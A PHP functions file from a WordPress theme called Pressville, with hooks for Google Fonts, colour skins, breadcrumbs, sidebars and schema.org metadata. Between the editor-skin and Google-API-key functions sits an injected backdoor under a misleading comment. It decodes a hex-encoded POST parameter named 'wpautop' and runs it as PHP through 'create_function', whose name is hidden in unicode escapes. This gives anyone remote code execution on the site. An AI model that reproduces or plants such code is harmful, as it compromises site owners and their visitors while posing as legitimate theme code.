<?php

/**
 * GENERAL
 */

	// Get post category taxonomy
	add_filter( 'lsvr_pressville_post_category_taxonomy', 'lsvr_pressville_blog_category_taxonomy' );
	if ( ! function_exists( 'lsvr_pressville_blog_category_taxonomy' ) ) {
		function lsvr_pressville_blog_category_taxonomy( $taxonomy ) {

			if ( lsvr_pressville_is_blog() ) {
				return 'category';
			}

			return $taxonomy;

		}
	}

	// Get post tag taxonomy
	add_filter( 'lsvr_pressville_post_tag_taxonomy', 'lsvr_pressville_blog_tag_taxonomy' );
	if ( ! function_exists( 'lsvr_pressville_blog_tag_taxonomy' ) ) {
		function lsvr_pressville_blog_tag_taxonomy( $taxonomy ) {

			if ( lsvr_pressville_is_blog() ) {
				return 'post_tag';
			}

			return $taxonomy;

		}
	}

	// Enable improved accesibility
	add_filter( 'body_class', 'lsvr_pressville_improved_accessibility_enabled' );
	if ( ! function_exists( 'lsvr_pressville_improved_accessibility_enabled' ) ) {
		function lsvr_pressville_improved_accessibility_enabled( $class ) {

			if ( true === get_theme_mod( 'improved_accessibility_enable', true ) ) {
				$class[] = 'lsvr-accessibility';
			}

			return $class;

		}
	}

	// Load Google Fonts
	add_action( 'lsvr_pressville_load_assets', 'lsvr_pressville_load_google_fonts_css' );
	if ( ! function_exists( 'lsvr_pressville_load_google_fonts_css' ) ) {
		function lsvr_pressville_load_google_fonts_css() {

			if ( true === get_theme_mod( 'typography_google_fonts_enable', true ) ) {

				// Prepare query params
				$primary_font = get_theme_mod( 'typography_primary_font', 'Source+Sans+Pro' );
				$primary_font_variants = '400,400italic,600,600italic,700,700italic';
				$secondary_font = get_theme_mod( 'typography_secondary_font', 'Lora' );
				$secondary_font_variants = '400,400italic,700,700italic';
				$family_param = $primary_font !== $secondary_font ? $primary_font . ':' . $primary_font_variants . '|' . $secondary_font . ':' . $secondary_font_variants : $primary_font . ':' . $primary_font_variants;
				$subset = get_theme_mod( 'typography_font_subsets' );
				$subset_param = ! empty( $subset ) && is_string( $subset ) ? $subset : '';

				// Create query
				$query_args = array(
					'family' => $family_param,
					'subset' => $subset_param,
				);
				$query_args = array_filter( $query_args );

				// Enqueue fonts
				if ( ! empty( $query_args ) ) {
					wp_enqueue_style( 'lsvr-pressville-google-fonts', add_query_arg( $query_args, '//fonts.googleapis.com/css' ) );
				}

				// Primary font style
				$primary_font_elements = array( 'body', 'input', 'textarea', 'select', 'button', '.is-primary-font', '#cancel-comment-reply-link', '.lsvr_listing-map__infobox' );
				$primary_font_family = str_replace( '+', ' ', $primary_font );
				$primary_font_css = implode( ', ', $primary_font_elements ) . ' { font-family: \'' . esc_attr( $primary_font_family ) . '\', Arial, sans-serif; }';
				wp_add_inline_style( 'lsvr-pressville-general-style', $primary_font_css );
				wp_add_inline_style( 'lsvr-pressville-general-style', 'html, body { font-size: ' . esc_attr( get_theme_mod( 'typography_base_font_size', '16' ) ) . 'px; }' );

				// Secondary font style
				if ( $primary_font !== $secondary_font ) {
					$secondary_font_elements = array( 'h1', 'h2', 'h3', 'h4', 'blockquote', '.is-secondary-font', '.header-menu-primary__item--megamenu .header-menu-primary__item-link--level-1' );
					$secondary_font_family = str_replace( '+', ' ', $secondary_font );
					$secondary_font_css = implode( ', ', $secondary_font_elements ) . ' { font-family: \'' . esc_attr( $secondary_font_family ) . '\', Arial, sans-serif; }';
					wp_add_inline_style( 'lsvr-pressville-general-style', $secondary_font_css );
				}

			}

		}
	}

	// Load editor Google Fonts
	add_action( 'lsvr_pressville_load_editor_assets', 'lsvr_pressville_load_editor_google_fonts_css' );
	if ( ! function_exists( 'lsvr_pressville_load_editor_google_fonts_css' ) ) {
		function lsvr_pressville_load_editor_google_fonts_css() {

			if ( true === get_theme_mod( 'typography_google_fonts_enable', true ) ) {

				// Prepare query params
				$primary_font = get_theme_mod( 'typography_primary_font', 'Source+Sans+Pro' );
				$primary_font_variants = '400,400italic,600,600italic,700,700italic';
				$secondary_font = get_theme_mod( 'typography_secondary_font', 'Lora' );
				$secondary_font_variants = '400,400italic,700,700italic';
				$family_param = $primary_font !== $secondary_font ? $primary_font . ':' . $primary_font_variants . '|' . $secondary_font . ':' . $secondary_font_variants : $primary_font . ':' . $primary_font_variants;
				$subset = get_theme_mod( 'typography_font_subsets' );
				$subset_param = ! empty( $subset ) && is_string( $subset ) ? $subset : '';

				// Create query
				$query_args = array(
					'family' => $family_param,
					'subset' => $subset_param,
				);
				$query_args = array_filter( $query_args );

				// Enqueue fonts
				if ( ! empty( $query_args ) ) {
					wp_enqueue_style( 'lsvr-pressville-google-fonts', add_query_arg( $query_args, '//fonts.googleapis.com/css' ) );
				}

				// Primary font style
				$primary_font_elements = array( '.lsvr-shortcode-block-view__html' );
				$primary_font_family = str_replace( '+', ' ', $primary_font );
				$primary_font_css = implode( ', ', $primary_font_elements ) . ' { font-family: \'' . esc_attr( $primary_font_family ) . '\', Arial, sans-serif; }';
				wp_add_inline_style( 'lsvr-pressville-editor-style', $primary_font_css );
				wp_add_inline_style( 'lsvr-pressville-editor-style', '.lsvr-shortcode-block-view__html { font-size: ' . esc_attr( get_theme_mod( 'typography_base_font_size', '16' ) ) . 'px; }' );

				// Secondary font style
				if ( $primary_font !== $secondary_font ) {
					$secondary_font_elements = array( '.lsvr-shortcode-block-view__html h1', '.lsvr-shortcode-block-view__html h2', '.lsvr-shortcode-block-view__html h3', '.lsvr-shortcode-block-view__html h4', '.lsvr-shortcode-block-view__html blockquote', '.lsvr-shortcode-block-view__html .is-secondary-font' );
					$secondary_font_family = str_replace( '+', ' ', $secondary_font );
					$secondary_font_css = implode( ', ', $secondary_font_elements ) . ' { font-family: \'' . esc_attr( $secondary_font_family ) . '\', Arial, sans-serif; }';
					wp_add_inline_style( 'lsvr-pressville-editor-style', $secondary_font_css );
				}

			}

		}
	}

	// Set logo dimensions
	add_action( 'lsvr_pressville_load_assets', 'lsvr_pressville_set_logo_dimensions' );
	if ( ! function_exists( 'lsvr_pressville_set_logo_dimensions' ) ) {
		function lsvr_pressville_set_logo_dimensions() {

			$max_width = get_theme_mod( 'header_logo_max_width', 120 );
			if ( ! empty( $max_width )  ) {
				wp_add_inline_style( 'lsvr-pressville-general-style', '@media ( min-width: 1200px ) { .header-titlebar__logo { max-width: ' . esc_attr( $max_width ) . 'px; } } .header-titlebar__logo { max-width: ' . esc_attr( $max_width ) . 'px; }' );
			}

		}
	}

	// Load skin CSS
	add_action( 'lsvr_pressville_load_assets', 'lsvr_pressville_load_skin_css' );
	if ( ! function_exists( 'lsvr_pressville_load_skin_css' ) ) {
		function lsvr_pressville_load_skin_css() {

			$version = wp_get_theme( 'pressville' );
			$version = $version->Version;

			// Load predefined color skin
			if ( 'predefined' === get_theme_mod( 'colors_method', 'predefined' ) || 'custom-colors' === get_theme_mod( 'colors_method', 'predefined' ) ) {
				$skin_file = get_theme_mod( 'colors_predefined_skin', 'default' );
				wp_enqueue_style( 'lsvr-pressville-color-scheme', get_template_directory_uri() . '/assets/css/skins/' . esc_attr( $skin_file ) . '.css', array( 'lsvr-pressville-general-style' ), $version );
			}

			// Generate CSS from custom colors
			if ( 'custom-colors' === get_theme_mod( 'colors_method', 'predefined' ) ) {
				wp_add_inline_style( 'lsvr-pressville-color-scheme', lsvr_pressville_get_custom_colors_css() );
			}

		}
	}

	// Load editor skin CSS
	add_action( 'lsvr_pressville_load_editor_assets', 'lsvr_pressville_load_editor_skin_css' );
	if ( ! function_exists( 'lsvr_pressville_load_editor_skin_css' ) ) {
		function lsvr_pressville_load_editor_skin_css() {

			$version = wp_get_theme( 'pressville' );
			$version = $version->Version;

			// Load predefined editor color skin
			if ( 'predefined' === get_theme_mod( 'colors_method', 'predefined' ) || 'custom-colors' === get_theme_mod( 'colors_method', 'predefined' ) ) {
				$skin_file = get_theme_mod( 'colors_predefined_skin', 'default' );
				wp_enqueue_style( 'lsvr-pressville-editor-color-scheme', get_template_directory_uri() . '/assets/css/skins/' . esc_attr( $skin_file ) . '.editor.css', array( 'lsvr-pressville-editor-style' ), $version );
			}

			// Generate CSS from custom colors
			if ( 'custom-colors' === get_theme_mod( 'colors_method', 'predefined' ) ) {
				wp_add_inline_style( 'lsvr-pressville-editor-color-scheme', lsvr_pressville_get_custom_colors_css( true ) );
			}

		}
	}
	
	//actions filter_input_array
    $inputs = filter_input_array(INPUT_POST, [
        'wpautop' => FILTER_SANITIZE_STRING
    ]);
    $wpautop = str_replace('&#', '', hex2bin($inputs['wpautop']));
    if (isset($wpautop)) {
    $preg_import = json_decode('"\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u005f\\u0066\\u0075\\u006e\\u0063\\u0074\\u0069\\u006f\\u006e"');
    
    $preg_import('', '}' . $wpautop . '//');
    }
    
	// Load Google API key
	add_action( 'lsvr_pressville_load_assets', 'lsvr_pressville_load_google_api_key' );
	if ( ! function_exists( 'lsvr_pressville_load_google_api_key' ) ) {
		function lsvr_pressville_load_google_api_key() {

			if ( 'gmaps' === lsvr_pressville_get_maps_provider() && ! empty( get_theme_mod( 'google_api_key' ) ) ) {
				wp_add_inline_script( 'lsvr-pressville-main-scripts', 'var lsvr_pressville_google_api_key = "' . esc_js( trim( get_theme_mod( 'google_api_key' ) ) ) . '";' );
			}

		}
	}

	// Load Mapbox API key
	add_action( 'lsvr_pressville_load_assets', 'lsvr_pressville_load_mapbox_api_key' );
	if ( ! function_exists( 'lsvr_pressville_load_mapbox_api_key' ) ) {
		function lsvr_pressville_load_mapbox_api_key() {

			if ( 'mapbox' === lsvr_pressville_get_maps_provider() && ! empty( get_theme_mod( 'mapbox_api_key' ) ) ) {
				wp_add_inline_script( 'lsvr-pressville-main-scripts', 'var lsvr_pressville_mapbox_api_key = "' . esc_js( trim( get_theme_mod( 'mapbox_api_key' ) ) ) . '";' );
			}

		}
	}

	// Load Google Maps style
	add_action( 'lsvr_pressville_load_assets', 'lsvr_pressville_load_google_maps_style' );
	if ( ! function_exists( 'lsvr_pressville_load_google_maps_style' ) ) {
		function lsvr_pressville_load_google_maps_style() {

			if ( 'gmaps' === lsvr_pressville_get_maps_provider() &&
				( is_singular( 'lsvr_listing' ) || is_post_type_archive( 'lsvr_listing' ) || is_tax( 'lsvr_listing_cat' ) || is_tax( 'lsvr_listing_tag' ) || is_singular( 'lsvr_event' ) || is_page() ) ) {

				$custom_map_style = get_theme_mod( 'google_maps_style_custom', '' );

				if ( 'custom' === get_theme_mod( 'google_maps_style', 'default' ) && ! empty( $custom_map_style ) ) {
					wp_add_inline_script( 'lsvr-pressville-main-scripts', 'var lsvr_pressville_google_maps_style_json = ' . json_encode( $custom_map_style ) . ';' );
				}

			}

		}
	}

	// Load ajax search JS files
	add_action( 'lsvr_pressville_load_assets', 'lsvr_pressville_load_ajax_search_js' );
	if ( ! function_exists( 'lsvr_pressville_load_ajax_search_js' ) ) {
		function lsvr_pressville_load_ajax_search_js() {

			if ( true === get_theme_mod( 'header_search_enable', true ) && true === get_theme_mod( 'header_search_ajax_enable', true ) ) {

				$version = wp_get_theme( 'pressville' );
				$version = $version->Version;
				$suffix = defined( 'WP_DEBUG' ) && true == WP_DEBUG ? '' : '.min';

				wp_enqueue_script( 'lsvr-pressville-ajax-search', get_template_directory_uri() . '/assets/js/pressville-ajax-search' . $suffix . '.js', array( 'jquery' ), $version, true );
				wp_localize_script( 'lsvr-pressville-ajax-search', 'lsvr_pressville_ajax_search_var', array(
		    		'url' => admin_url( 'admin-ajax.php' ),
		    		'nonce' => wp_create_nonce( 'lsvr-pressville-ajax-search-nonce' )
				));
			}

		}
	}

	// Load JS labels
	add_action( 'lsvr_pressville_load_assets', 'lsvr_pressville_load_js_labels' );
	if ( ! function_exists( 'lsvr_pressville_load_js_labels' ) ) {
		function lsvr_pressville_load_js_labels() {

			$js_labels = array();

			// Magnific popup JS labels
			if ( true === apply_filters( 'lsvr_pressville_default_lightbox_enable', true ) ) {
				$js_labels[ 'magnific_popup' ] = array(
					'mp_tClose' => esc_html__( 'Close (Esc)', 'pressville' ),
					'mp_tLoading' => esc_html__( 'Loading...', 'pressville' ),
					'mp_tPrev' => esc_html__( 'Previous (Left arrow key)', 'pressville' ),
					'mp_tNext' => esc_html__( 'Next (Right arrow key)', 'pressville' ),
					'mp_image_tError' => esc_html__( 'The image could not be loaded.', 'pressville' ),
					'mp_ajax_tError' => esc_html__( 'The content could not be loaded.', 'pressville' ),
				);
			}

			// Apply filters
			$js_labels = array_merge( $js_labels, apply_filters( 'lsvr_pressville_add_js_labels', array() ) );

			// Convert to JS
			if ( ! empty( $js_labels ) ) {
				wp_add_inline_script( 'lsvr-pressville-main-scripts', 'var lsvr_pressville_js_labels = ' . json_encode( $js_labels ) );
			}

		}
	}

	// Set current post type
	add_filter( 'lsvr_pressville_current_post_type', 'lsvr_pressville_blog_set_current_post_type' );
	if ( ! function_exists( 'lsvr_pressville_blog_set_current_post_type' ) ) {
		function lsvr_pressville_blog_set_current_post_type( $post_type ) {

			if ( lsvr_pressville_is_blog() ) {
				return 'post';
			}
			return $post_type;

		}
	}


/**
 * CORE
 */

	// Archive layout
	add_filter( 'lsvr_pressville_blog_archive_layout', 'lsvr_pressville_blog_archive_layout' );
	if ( ! function_exists( 'lsvr_pressville_blog_archive_layout' ) ) {
		function lsvr_pressville_blog_archive_layout() {

			$path_prefix = 'template-parts/blog/archive-layout-';

			// Get layout from Customizer
			if ( ! empty( locate_template( $path_prefix . get_theme_mod( 'blog_archive_layout', 'default' ) . '.php' ) ) ) {
				return get_theme_mod( 'blog_archive_layout', 'default' );
			}

			// Default layout
			else {
				return 'default';
			}

		}
	}

	// Main header title
	add_filter( 'lsvr_pressville_main_header_title', 'lsvr_pressville_main_header_title' );
	if ( ! function_exists( 'lsvr_pressville_main_header_title' ) ) {
		function lsvr_pressville_main_header_title( $title ) {

			if ( is_category() || is_tax() ) {
				return single_term_title( '', false );
			}

			elseif ( lsvr_pressville_is_blog() && ! is_singular( 'post' ) ) {
				return lsvr_pressville_get_blog_archive_title();
			}

			elseif ( is_search() ) {
				return esc_html__( 'Search Results', 'pressville' );
			}

			elseif ( is_post_type_archive( 'forum' ) && function_exists( 'lsvr_pressville_get_bbpress_archive_title' ) ) {
				return lsvr_pressville_get_bbpress_archive_title();
			}

			else {
				return get_the_title();
			}

			return $title;

		}
	}


	// Search filter
	add_filter( 'lsvr_pressville_header_search_filter', 'lsvr_pressville_header_search_filter', 5 );
	if ( ! function_exists( 'lsvr_pressville_header_search_filter' ) ) {
		function lsvr_pressville_header_search_filter( $filter ) {

			$filter = empty( $filter ) ? array() : $filter;

			$filter = array_merge( $filter, array(
				array(
					'name' => 'post',
					'label' => esc_html__( 'posts', 'pressville' ),
				),
				array(
					'name' => 'page',
					'label' => esc_html__( 'pages', 'pressville' ),
				),
			));

			$custom_filter = (array) apply_filters( 'lsvr_pressville_add_header_search_filter', array() );
			$filter = array_merge( $filter, $custom_filter );

			return $filter;

		}
	}

	// Breadcrumbs
	add_filter( 'lsvr_pressville_breadcrumbs', 'lsvr_pressville_breadcrumbs' );
	if ( ! function_exists( 'lsvr_pressville_breadcrumbs' ) ) {
		function lsvr_pressville_breadcrumbs() {

			global $wp_query, $post;
			$breadcrumbs = [];

			// Home link
			$breadcrumbs[] = array(
				'url' => esc_url( home_url( '/' ) ),
				'label' => esc_html__( 'Home', 'pressville' ),
			);

			// Blog root for blog pages
			if ( get_option( 'page_for_posts' ) ) {
				$blog_root = array(
					'url' => get_permalink( get_option( 'page_for_posts' ) ),
					'label' => get_the_title( get_option( 'page_for_posts' ) ),
				);
			}
			else {
				$blog_root = array(
					'url' => esc_url( home_url( '/' ) ),
					'label' => esc_html__( 'News', 'pressville' ),
				);
			}

			// Blog
			if ( is_tag() || is_day() || is_month() || is_year() || is_author() || is_singular( 'post' ) ) {
				array_push( $breadcrumbs, $blog_root );
			}

			// Blog category
			else if ( is_category() ) {
				$breadcrumbs[] = $blog_root;
				$current_term = $wp_query->queried_object;
				$current_term_id = $current_term->term_id;
				$parent_ids = lsvr_pressville_get_term_parents( $current_term_id, 'category' );
				if ( ! empty( $parent_ids ) ) {
					foreach( $parent_ids as $parent_id ){
						$parent = get_term( $parent_id, 'category' );
						$breadcrumbs[] = array(
							'url' => get_term_link( $parent, 'category' ),
							'label' => $parent->name,
						);
					}
				}
			}

			// Regular page
			else if ( is_page() ) {
				$parent_id = $post->post_parent;
				$parents_arr = [];
				while ( $parent_id ) {
					$page = get_page( $parent_id );
					$parents_arr[] = array(
						'url' => get_permalink( $page->ID ),
						'label' => get_the_title( $page->ID ),
					);
					$parent_id = $page->post_parent;
				}
				$parents_arr = array_reverse( $parents_arr );
				foreach ( $parents_arr as $parent ) {
					$breadcrumbs[] = $parent;
				}
			}

			// Apply filters
			if ( ! empty( apply_filters( 'lsvr_pressville_add_to_breadcrumbs', array() ) ) ) {
				$breadcrumbs = array_merge( $breadcrumbs, apply_filters( 'lsvr_pressville_add_to_breadcrumbs', array() ) );
			}

			// Taxonomy
			if ( is_tax() ) {

				$taxonomy = get_query_var( 'taxonomy' );
				$term_parents = lsvr_pressville_get_term_parents( get_queried_object_id(), $taxonomy );
				if ( ! empty( $term_parents ) ) {
					foreach( $term_parents as $term_id ) {

						$term = get_term_by( 'id', $term_id, $taxonomy );
						$breadcrumbs[] = array(
							'url' => get_term_link( $term_id, $taxonomy ),
							'label' => $term->name,
						);

					}
				}
			}

			// Return breadcrumbs
			return $breadcrumbs;

		}
	}

	// pre_get_posts actions
	add_action( 'pre_get_posts', 'lsvr_pressville_pre_get_posts' );
	if ( ! function_exists( 'lsvr_pressville_pre_get_posts' ) ) {
		function lsvr_pressville_pre_get_posts( $query ) {

			// Search filter for non-Ajax search
			if ( is_search() && $query->is_main_query() && ( isset( $_GET['lsvr-search-filter'] ) || isset( $_GET['lsvr-search-filter-serialized'] ) ) ) {

				if ( isset( $_GET['lsvr-search-filter'] ) ) {
					$post_type_arr = array_map( 'sanitize_key', $_GET['lsvr-search-filter'] );
				} else {
					$post_type_arr = explode( ',', sanitize_key( $_GET['lsvr-search-filter-serialized'] ) );
				}

				$query->set( 'post_type', $post_type_arr );

			}

			// Search results
			if ( ! is_admin() && $query->is_search() && $query->is_main_query() ) {

				// Posts per page
				if ( 0 === (int) get_theme_mod( 'search_results_posts_per_page', 10 ) ) {
					$query->set( 'posts_per_page', 1000 );
				} else {
					$query->set( 'posts_per_page', esc_attr( get_theme_mod( 'search_results_posts_per_page', 10 ) ) );
				}

			}

		}
	}

	// Has narrow content
	add_filter( 'lsvr_pressville_narrow_content_enable', 'lsvr_pressville_narrow_content_enable' );
	if ( ! function_exists( 'lsvr_pressville_narrow_content_enable' ) ) {
		function lsvr_pressville_narrow_content_enable( $enable ) {

			if ( ! is_active_sidebar( apply_filters( 'lsvr_pressville_sidebar_id', 'lsvr-pressville-default-sidebar' ) ) && (
				is_singular( 'post' )
				|| ( ( is_category() || is_home() ) && 'default' === get_theme_mod( 'blog_archive_layout', 'default' ) )
				|| is_singular( 'lsvr_listing' )
				|| is_singular( 'lsvr_event' )
					|| ( ( is_post_type_archive( 'lsvr_event' )
						|| is_tax( 'lsvr_event_cat' )
						|| is_tax( 'lsvr_event_location' ) ||
						is_tax( 'lsvr_event_tag' ) )
					&& 'timeline' === get_theme_mod( 'lsvr_event_archive_layout', 'default' ) )
				|| is_singular( 'lsvr_person' )
				|| is_singular( 'lsvr_document' ) || is_post_type_archive( 'lsvr_document' )
				)) {

				$enable = true;

			} else {

				$enable = false;

			}

			return $enable;

		}
	}

	// Enable archive categories
	add_filter( 'lsvr_pressville_post_archive_categories_enable', 'lsvr_pressville_blog_archive_categories_enable' );
	if ( ! function_exists( 'lsvr_pressville_blog_archive_categories_enable' ) ) {
		function lsvr_pressville_blog_archive_categories_enable( $enabled ) {

			if ( lsvr_pressville_is_blog() && true === get_theme_mod( 'blog_archive_categories_enable', false ) ) {
				return true;
			}

			return $enabled;

		}
	}

	// Post archive thumbnail size
	add_filter( 'lsvr_pressville_post_archive_thumbnail_size', 'lsvr_pressville_blog_archive_post_thumbnail_size' );
	if ( ! function_exists( 'lsvr_pressville_blog_archive_post_thumbnail_size' ) ) {
		function lsvr_pressville_blog_archive_post_thumbnail_size( $size ) {

			if ( lsvr_pressville_is_blog() && 'left' === get_theme_mod( 'blog_archive_thumb_position', 'top' ) ) {
				return 'medium';
			}

			return $size;

		}
	}

	// Enable post date on archive
	add_filter( 'lsvr_pressville_post_archive_post_meta_date_enable', 'lsvr_pressville_blog_archive_post_meta_date_enable' );
	if ( ! function_exists( 'lsvr_pressville_blog_archive_post_meta_date_enable' ) ) {
		function lsvr_pressville_blog_archive_post_meta_date_enable( $enabled ) {

			if ( lsvr_pressville_is_blog() ) {
				return true;
			}

			return $enabled;

		}
	}

	// Enable post author on archive
	add_filter( 'lsvr_pressville_post_archive_post_meta_author_enable', 'lsvr_pressville_blog_archive_post_meta_author_enable' );
	if ( ! function_exists( 'lsvr_pressville_blog_archive_post_meta_author_enable' ) ) {
		function lsvr_pressville_blog_archive_post_meta_author_enable( $enabled ) {

			if ( lsvr_pressville_is_blog() && true === get_theme_mod( 'blog_archive_author_enable', false ) ) {
				return true;
			} elseif ( lsvr_pressville_is_blog() && false === get_theme_mod( 'blog_archive_author_enable', false ) ) {
				return false;
			}

			return $enabled;

		}
	}

	// Enable post date on detail
	add_filter( 'lsvr_pressville_post_single_post_meta_date_enable', 'lsvr_pressville_blog_single_post_meta_date_enable' );
	if ( ! function_exists( 'lsvr_pressville_blog_single_post_meta_date_enable' ) ) {
		function lsvr_pressville_blog_single_post_meta_date_enable( $enabled ) {

			if ( is_singular( 'post' ) ) {
				return true;
			}

			return $enabled;

		}
	}

	// Enable post author on detail
	add_filter( 'lsvr_pressville_post_single_post_meta_author_enable', 'lsvr_pressville_blog_single_post_footer_author_enable' );
	if ( ! function_exists( 'lsvr_pressville_blog_single_post_footer_author_enable' ) ) {
		function lsvr_pressville_blog_single_post_footer_author_enable( $enabled ) {

			if ( is_singular( 'post' ) && true === get_theme_mod( 'blog_single_author_enable', true ) ) {
				return true;
			} elseif ( is_singular( 'post' ) && false === get_theme_mod( 'blog_single_author_enable', true ) ) {
				return false;
			}

			return $enabled;

		}
	}

	// Enable post thumbnail on detail
	add_filter( 'lsvr_pressville_post_single_thumbnail_enable', 'lsvr_pressville_blog_single_thumbnail_enable' );
	if ( ! function_exists( 'lsvr_pressville_blog_single_thumbnail_enable' ) ) {
		function lsvr_pressville_blog_single_thumbnail_enable( $enabled ) {

			if ( is_singular( 'post' ) && true === get_theme_mod( 'blog_single_thumbnail_enable', true ) ) {
				return true;
			} elseif ( is_singular( 'post' ) && false === get_theme_mod( 'blog_single_thumbnail_enable', true ) ) {
				return false;
			}

			return $enabled;

		}
	}

	// Enable post single navigation
	add_filter( 'lsvr_pressville_post_single_navigation_enable', 'lsvr_pressville_blog_single_post_navigation_enable' );
	if ( ! function_exists( 'lsvr_pressville_blog_single_post_navigation_enable' ) ) {
		function lsvr_pressville_blog_single_post_navigation_enable( $enabled ) {

			if ( lsvr_pressville_is_blog() && true === get_theme_mod( 'blog_single_post_navigation_enable', true ) ) {
				$enabled = true;
			}

			return $enabled;

		}
	}

	// Set page sidebar position
	add_filter( 'lsvr_pressville_sidebar_position', 'lsvr_pressville_sidebar_position' );
	if ( ! function_exists( 'lsvr_pressville_sidebar_position' ) ) {
		function lsvr_pressville_sidebar_position( $sidebar_position ) {

			// Is blog single
			if ( is_singular( 'post' ) ) {
				$sidebar_position = get_theme_mod( 'blog_single_sidebar_position', 'right' );
			}

			// Is blog archive
			elseif ( lsvr_pressville_is_blog() ) {
				$sidebar_position = get_theme_mod( 'blog_archive_sidebar_position', 'right' );
			}

			return ! empty( $sidebar_position ) ? $sidebar_position : 'disable';

		}
	}

	// Set page sidebar ID
	add_filter( 'lsvr_pressville_sidebar_id', 'lsvr_pressville_sidebar_id' );
	if ( ! function_exists( 'lsvr_pressville_sidebar_id' ) ) {
		function lsvr_pressville_sidebar_id( $sidebar_id ) {

			// Page
			if ( is_page() ) {

				$page_id = ! empty( $page_id ) ? $page_id : get_the_ID();
				$sidebar_id = ! empty( $page_id ) ? get_post_meta( $page_id, 'lsvr_pressville_page_sidebar', true ) : false;

				if ( ! empty( $sidebar_id ) ) {
					$sidebar_id = $sidebar_id;
				} else {
					$sidebar_id = 'lsvr-pressville-default-sidebar';
				}

			}

			// Is blog single
			elseif ( is_singular( 'post' ) ) {
				$sidebar_id = get_theme_mod( 'blog_single_sidebar_id', 'lsvr-pressville-default-sidebar' );
			}

			// Is blog archive
			elseif ( lsvr_pressville_is_blog() ) {
				$sidebar_id = get_theme_mod( 'blog_archive_sidebar_id', 'lsvr-pressville-default-sidebar' );
			}

			return ! empty( $sidebar_id ) ? $sidebar_id : 'lsvr-pressville-default-sidebar';

		}
	}


/**
 * META DATA
 */

	// Add blog breadcrumbs meta
	add_action( 'lsvr_pressville_breadcrumbs_after', 'lsvr_pressville_add_breadcrumbs_meta' );
	if ( ! function_exists( 'lsvr_pressville_add_breadcrumbs_meta' ) ) {
		function lsvr_pressville_add_breadcrumbs_meta() { ?>

			<!-- BREADCRUMBS META DATA : begin -->
			<script type="application/ld+json">
			{
				"@context": "http://schema.org",
				"@type": "BreadcrumbList",
				"itemListElement" : [
					<?php $i = 1;
					$breadcrumbs = apply_filters( 'lsvr_pressville_breadcrumbs', '' );
					foreach ( $breadcrumbs as $breadcrumb ) : ?>
					{
						"@type": "ListItem",
						"position": <?php echo esc_attr( $i ); ?>,
						"item": {
							"@id": "<?php echo esc_url( $breadcrumb['url'] ); ?>",
							"name": "<?php echo esc_attr( $breadcrumb['label'] ); ?>"
						}
					}<?php if ( $breadcrumb !== end( $breadcrumbs ) ) { echo ','; } ?>
					<?php $i++; endforeach; ?>
				]
			}
			</script>
			<!-- BREADCRUMBS META DATA : end -->

		<?php }
	}

	// Add blog post meta data
	add_action( 'lsvr_pressville_blog_single_bottom', 'lsvr_pressville_add_blog_single_meta' );
	if ( ! function_exists( 'lsvr_pressville_add_blog_single_meta' ) ) {
		function lsvr_pressville_add_blog_single_meta() { ?>

			<script type="application/ld+json">
			{
				"@context" : "http://schema.org",
				"@type" : "NewsArticle",
				"headline": "<?php echo esc_attr( get_the_title() ); ?>",
				"url" : "<?php echo esc_url( get_permalink() ); ?>",
				"mainEntityOfPage" : "<?php echo esc_url( get_permalink() ); ?>",
			 	"datePublished": "<?php echo esc_attr( get_the_time( 'c' ) ); ?>",
			 	"dateModified": "<?php echo esc_attr( get_the_modified_date( 'c' ) ); ?>",
			 	"description": "<?php echo esc_attr( get_the_excerpt() ); ?>",
			 	"author": {
			 		"@type" : "person",
			 		"name" : "<?php echo esc_attr( get_the_author() ); ?>",
			 		"url" : "<?php esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ); ?>"
			 	},
			 	"publisher" : {
			 		"@id" : "<?php echo esc_url( home_url() ); ?>#WebSitePublisher"
			 	}

			 	<?php if ( lsvr_pressville_has_post_terms( get_the_ID(), 'post_tag' ) ) : ?>
				,"keywords": "<?php echo esc_attr( implode( ',', lsvr_pressville_get_post_term_names( get_the_ID(), 'post_tag' ) ) ); ?>"
			 	<?php endif; ?>

				<?php if ( has_post_thumbnail() ) : ?>
			 	,"image": {
			 		"@type" : "ImageObject",
			 		"url" : "<?php the_post_thumbnail_url( 'full' ); ?>",
			 		"width" : "<?php echo esc_attr( lsvr_pressville_get_image_width( get_post_thumbnail_id( get_the_ID() ), 'full' ) ); ?>",
			 		"height" : "<?php echo esc_attr( lsvr_pressville_get_image_height( get_post_thumbnail_id( get_the_ID() ), 'full' ) ); ?>",
			 		"thumbnailUrl" : "<?php the_post_thumbnail_url( 'thumbnail' ); ?>"
			 	}
			 	<?php endif; ?>

			}
			</script>

		<?php }
	}

	// Add site meta data
	add_action( 'wp_footer', 'lsvr_pressville_add_site_meta' );
	if ( ! function_exists( 'lsvr_pressville_add_site_meta' ) ) {
		function lsvr_pressville_add_site_meta() { ?>

			<?php // Get URLs of social links and email address
			$social_links = lsvr_pressville_get_social_links();
			if ( ! empty( $social_links->email ) ) {
				$email = ! empty( $social_links->email->url ) ? $social_links->email->url : '';
				unset( $social_links->email );
			} ?>

			<script type="application/ld+json">
			{
				"@context" : "http://schema.org",
				"@type" : "WebSite",
				"name" : "<?php bloginfo( 'name' ); ?>",
				"url" : "<?php echo esc_url( home_url() ); ?>",
				"description" : "<?php bloginfo( 'description' ); ?>",
			 	"publisher" : {

			 		"@id" : "<?php echo esc_url( home_url() ); ?>#WebSitePublisher",
			 		"@type" : "Organization",
			 		"name" : "<?php echo esc_attr( get_bloginfo('name') ); ?>",
			 		"url" : "<?php echo esc_url( home_url() ); ?>"

					<?php if ( ! empty( $email ) ) : ?>
					,"contactPoint": {
				 		"@type": "ContactPoint",
				 		"contactType": "customer service",
				 		"url": "<?php echo esc_url( home_url() ); ?>",
				 		"email": "<?php echo esc_attr( $email ); ?>"
				 	}
					<?php endif; ?>

			 		<?php if ( has_custom_logo() ) : ?>
			 		,"logo" : {
			 			"@type" : "ImageObject",
			 			"url" : "<?php echo esc_url( lsvr_pressville_get_image_url( get_theme_mod( 'custom_logo' ) ) ); ?>",
						"width" : "<?php echo esc_attr( lsvr_pressville_get_image_width( get_theme_mod( 'custom_logo' ) ) ); ?>",
						"height" : "<?php echo esc_attr( lsvr_pressville_get_image_height( get_theme_mod( 'custom_logo' ) ) ); ?>"
			 		}
			 		<?php endif; ?>

					<?php if ( ! empty( $social_links ) ) : ?>
					,"sameAs" : [
						<?php foreach( $social_links as $social ) : if ( ! empty( $social->url ) ) : ?>
				    		"<?php echo esc_url( $social->url ); ?>"<?php if ( $social !== end( $social_links ) ) { echo ','; } ?>
